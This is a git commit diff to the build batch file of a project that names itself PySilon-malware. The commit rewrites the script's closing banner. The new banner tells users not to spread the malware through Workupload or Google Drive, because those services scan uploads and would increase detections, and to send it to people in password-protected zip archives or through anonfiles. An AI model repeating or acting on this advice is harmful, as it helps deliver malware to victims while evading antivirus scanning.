d3c64247f6dbd7bd7b2f29c41c84bd280a63a885
whois-hoeless <whois@hoeless.com>
2023-06-08 02:15:21 +0200

    change the .bat

--- PySilon.bat
+++ PySilon.bat
@@ -9,5 +9,20 @@ pip install pillow
 pip install pyinstaller
 cls
 python builder.py
-echo #===============================================================# & echo # Software terminated.                                          # & echo #                                                               # & echo # If you like this project please consider giving me a star     # & echo # to let others know that this is something worth looking into. # & echo #===============================================================# & echo. & echo.
+echo #===============================================================# 
+echo #                    Software terminated.                       # 
+echo #                                                               # 
+echo #   Give us a Star on Github, this would really help us grow!   # 
+echo #        https://github.com/mategol/PySilon-malware             # 
+echo #                                                               #
+echo #   Also, please don't send this malware using websites like    #
+echo # Workupload or googledrive because they will scan the malware  #
+echo # and keep track of it and other ocurrences, which will result  #
+echo # in more detections in the future, please send it to people in #
+echo # a zip archive with a password, or use services like anonfiles #
+echo #                                                               #
+echo #                         Thank You!                            #
+echo #===============================================================# 
+echo. 
+echo.
 pause
